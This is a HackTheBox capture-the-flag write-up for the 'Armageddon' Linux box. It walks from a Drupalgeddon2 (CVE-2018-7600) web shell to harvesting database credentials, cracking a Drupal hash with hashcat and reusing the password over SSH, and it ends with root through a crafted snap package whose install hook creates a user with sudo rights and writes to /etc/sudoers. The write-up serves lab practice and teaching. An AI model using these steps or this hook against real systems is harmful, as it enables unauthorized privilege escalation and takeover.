# HTB Armageddon — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux (CentOS) |
| Difficulty | Easy |
| Stack | Drupal 7 / MySQL / snap |

## Attack Flow

Nmap scan → Identify Drupal 7 → Drupalgeddon2 RCE (CVE-2018-7600) → Land as apache → Find DB creds in Drupal settings.php → Dump MySQL users → Crack Drupal hash with hashcat → Password reuse SSH as brucetherealadmin → sudo snap install → Malicious snap package → root

## Phase 1: Enumeration

Standard nmap found port 80 running Drupal 7. Drupal version confirmed through the CHANGELOG.txt or meta tags on the site.

## Phase 2: Initial Access — Drupalgeddon2 (CVE-2018-7600)

Drupal 7 has a well-known RCE vulnerability. Used the Ruby exploit (`44449.rb`) to get a web shell as the `apache` user.

Important: the shell you land in is a dumb shell (non-interactive). You can't run interactive commands, chain commands with semicolons freely, or use features like tab completion. Run one command at a time.

### Reverse/Bind Shell Issues

SELinux on CentOS blocks outbound TCP connections from the apache process. Tried multiple meterpreter payloads and reverse shells — sessions kept dying immediately. Bind shells also failed. The web shell ended up being the way to enumerate from this position.

Lesson: on CentOS/RHEL boxes, always consider SELinux as the reason shells die. If reverse and bind shells both fail, work with what you have (the web shell).

## Phase 3: Lateral Movement — Database Credentials

### Drupal stores DB creds in settings.php

This is a key thing to remember. Drupal keeps database credentials in:

```
/var/www/html/sites/default/settings.php
```

Found credentials:
- Database: drupal
- Username: drupaluser
- Password: CQHEy@9M*m23gBVj

### MySQL Enumeration

Can't use interactive mysql because the shell is non-interactive. Also, `mysql -h 127.0.0.1` fails because SELinux blocks Apache from making TCP connections to MySQL. Fix: drop the `-h` flag so it uses the Unix socket, and use `-e` for one-liner queries.

```bash
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -D drupal -e "SELECT name,pass FROM users;"
```

Got the hash for brucetherealadmin:
```
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

### Cracking the Drupal Hash

Drupal 7 uses a modified SHA-512 hash. Hashcat mode is **7900**:

```bash
hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked password: `booboo`

### SSH as brucetherealadmin

Password reuse — `booboo` works for SSH:

```bash
ssh brucetherealadmin@TARGET_IP
```

## Phase 4: Privilege Escalation — Malicious Snap Package

### Enumeration

```bash
sudo -l
```

Output: `(root) NOPASSWD: /usr/bin/snap install *`

Bruce can install any snap package as root without a password. Snap's install hooks run as root during installation.

### Building the Malicious Snap

On Kali, create a snap package with an install hook that creates a new privileged user:

```bash
mkdir -p /tmp/final_snap/meta/hooks

cat > /tmp/final_snap/meta/snap.yaml << "EOF"
name: snap-user
version: '0.1'
summary: Empty snap, used for exploit
description: This is an example
architectures: [amd64]
confinement: devmode
grade: devel
EOF

cat > /tmp/final_snap/meta/hooks/install << "EOF"
#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF

chmod 755 /tmp/final_snap/meta/hooks/install
cd /tmp/final_snap
mksquashfs . /tmp/snap-user.snap -noappend -comp xz -all-root
```

The `-all-root` flag is critical — it sets all file ownership to root (uid 0) so the target's snap daemon can read the package properly. Without it you get "failed to read id table" errors.

### Transfer and Install

```bash
scp /tmp/snap-user.snap brucetherealadmin@TARGET_IP:/tmp/
```

On the target:

```bash
sudo /usr/bin/snap install /tmp/snap-user.snap --dangerous --devmode
su snap_user
# password: snap_user
sudo su
cat /root/root.txt
```

`--dangerous` allows installing unsigned snaps. `--devmode` disables snap sandboxing.

## Methodology Notes

### Drupal Enumeration Checklist

- Check CHANGELOG.txt for exact version
- Drupal 7 → check for Drupalgeddon2 (CVE-2018-7600) and Drupalgeddon3 (CVE-2018-7602)
- DB credentials are always in `/var/www/html/sites/default/settings.php`
- Drupal 7 password hashes use hashcat mode 7900

### Working with Dumb Shells

- One command at a time — no semicolons, no pipes, no interactive programs
- Use `-e` flag for mysql one-liners instead of interactive mode
- If mysql via TCP fails (SELinux), drop the `-h` flag to use Unix sockets
- Commands that need `+` signs (like `chmod +x`) may get stripped — find alternatives

### Snap Privesc

- `sudo snap install` as root = game over
- Install hooks (`meta/hooks/install`) run as root during package installation
- Build snaps with `mksquashfs` — don't need snapcraft
- Always use `-all-root` flag with mksquashfs
- Use `--dangerous --devmode` flags when installing unsigned custom snaps
- The hook can create a new user with sudo rights, copy bash with SUID, or write to sudoers

### SELinux Awareness

- SELinux on CentOS/RHEL can block outbound connections from web server processes
- Reverse shells and bind shells may both fail silently
- Check with `getenforce` if you can
- Apache connecting to MySQL via TCP (127.0.0.1) can be blocked — use Unix socket instead (no `-h` flag)
- If all shell attempts fail, enumerate through the existing web shell
